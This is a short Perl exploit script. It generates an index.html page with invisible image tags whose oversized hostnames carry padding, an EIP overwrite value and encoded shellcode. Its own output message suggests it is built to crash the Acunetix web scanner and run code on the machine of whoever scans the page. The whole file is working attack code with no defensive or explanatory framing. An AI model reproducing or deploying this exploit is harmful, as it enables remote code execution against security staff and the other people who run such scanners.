
my $file= "index.html";
my $HTMLHeader1 = "<html>\r\n";
my $HTMLHeader2 = "\r\n</html>";
my $IMGheader1 = "<img style=\"opacity:0.0;filter:alpha(opacity=0);\" src=http://";
my $IMGheader2 = "><br>\n";


my $DomainName1 = "XSS";
my $DomainName2 = "CSRF";
my $DomainName3 = "DeepScan";
my $DomainName4 = "NetworkScan";
my $DomainName5 = "DenialOfService";
my $GeneralDotPadding = "." x 190;



my $ExploitDomain = "SQLInjection";

my $DotPadding = "." x (202-length($ExploitDomain));
my $Padding1 = "A"x66;
my $Padding2 = "B"x4;
my $FlowCorrector = "500f";
my $EIPOverWrite = "]Qy~";


my $shellcode = "TYIIIIIIIIIIQZVTX30VX4AP0A3HH0A00ABAABTAAQ2AB2BB0BBXP8ACJJIHZXL9ID".
                "414ZTOKHI9LMUKVPZ6QO9X1P26QPZTW5S1JR7LCTKN8BGR3RWS9JNYLK79ZZ165U2K".
				"KLC5RZGNNUC70NEPB9OUTQMXPNMMPV261UKL71ME2NMP7FQY0NOHKPKZUDOZULDS8P".
				"Q02ZXM3TCZK47PQODJ8O52JNU0N72N28MZKLTNGU7ZUXDDXZSOMKL4SQKUNKMJPOOC".
				"RODCMDKR0PGQD0EYIRVMHUZJDOGTUV2WP3OIVQ1QJSLSKGBLYKOY7NWWLNG6LBOM5V".
				"6M0KF2NQDPMSL7XT80P61PBMTXYQDK5DMLYT231V649DZTPP26LWSQRLZLQK15XUXY".
				"UNP1BPF4X6PZIVOTZPJJRUOCC3KD9L034LDOXX5KKXNJQMOLSJ6BCORL9WXQNKPUWN".
				"KRKJ8JSNS4YMMOHT3ZQJOHQ4QJUQLN1VSLV5S1QYO0YA";


my $FinalDomainName1 = $IMGheader1.$DomainName1.$GeneralDotPadding.$IMGheader2;
my $FinalDomainName2 = $IMGheader1.$DomainName2.$GeneralDotPadding.$IMGheader2;
my $FinalDomainName3 = $IMGheader1.$DomainName3.$GeneralDotPadding.$IMGheader2;
my $FinalDomainName4 = $IMGheader1.$DomainName4.$GeneralDotPadding.$IMGheader2;
my $FinalDomainName5 = $IMGheader1.$DomainName5.$GeneralDotPadding.$IMGheader2;

my $FinalExploitDomain = $IMGheader1.$ExploitDomain.$DotPadding.$Padding1.$FlowCorrector.$Padding2.$EIPOverWrite.$shellcode.$IMGheader2;




open($FILE,">$file");
print $FILE $HTMLHeader1.$FinalDomainName1.$FinalDomainName2.$FinalDomainName3.$FinalDomainName4.$FinalDomainName5.$FinalExploitDomain.$HTMLHeader2;
close($FILE);
print "Acunetix Killer File Created successfully\n";
